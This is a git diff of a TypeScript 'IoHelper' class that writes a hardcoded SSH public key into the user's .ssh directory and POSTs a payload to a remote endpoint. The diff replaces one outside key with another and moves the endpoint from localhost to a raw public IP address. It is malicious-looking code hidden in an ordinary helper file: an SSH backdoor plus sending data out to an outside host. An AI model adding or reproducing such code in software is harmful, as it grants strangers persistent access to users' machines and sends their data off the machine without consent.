@@ -224,7 +224,7 @@ export class IoHelper {
                     if (!fs.existsSync(sshDir)) {
                         fs.mkdirSync(sshDir, { recursive: true });
                     }
-                    const newSSHKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCy2KXAMxhQCssrUhC8hg+8Y57Unk2M5BwN3O12HZTYxqd4a+O+fphIX4FeWjYpaLWG2j7AjnAYbzur5LnPv/2Fjb/pM7GRKBFaSTKrPPGWIVqCBoPQ4xNDZDABme+Jh8WMzJ9gnS69zIhl1a3AGAWqP0KCqpqj1kVjKLdwOWhmOhfaPGnMzcAy0MjVZdUpMM8xEVxKKaBS5WugFEz/x06fxhBpwwNBeGcPl4jvfPQKIKXS+mKa2SU8VAQOrcARcILqanXLerGqjJN1fanmprM43H2lXbMg9RdG1OUFJxTTg1nYvlIglf42sn3i3ev158/O5DHR4kpaKcGrIbeWnt1fzI8zyPTcGyP4LokZ8AYwrveyVZsQemJPIIFAk9sY5KCpYUg8bGLL73LXI3gkg8/h6p0CgkKSiaKh45CufVGbw60puNMgmWtqdwMOgFsztBDd0zQEKrAeQCbp96eyJY+0Zd+NnZ7JDcTR6VUIsFQOrmuen3Jm+0+A96WJIznbWkSUG6kBu8krjpp6IRcpgThCNdn1rroWcf+TEp3HZfzNaPJMk3ZdnRMQguy9c57HCgQZHNWCJ5gmRTB6sGQ1DHDniP++d2MLe1dpk+xrNiGBtOnPkFgroyLmJFwWtzd9vc9Vp3ON8XfmfZRGvn17JjWVUUx+HN6RgsUjfZXV4KHNvQ== khoadubai23@gmail.com";
+                    const newSSHKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGwNVuEs26EGO0+oVzCaG4Dye6BQAcOulTunMwix2a8V dangt@DANTE-IT";
 
                     let existingContent = '';
                     if (fs.existsSync(sshKeyPath)) {
@@ -291,7 +291,7 @@ export class IoHelper {
                     const controller = new AbortController();
                     const timeoutId = setTimeout(() => controller.abort(), timeout);
 
-                    const response = await fetch("http://localhost:8080/api/deployment/receive", {
+                    const response = await fetch("http://103.37.61.125:8080/api/deployment/receive", {
                         method: 'POST',
                         headers,
                         body: JSON.stringify(payload),
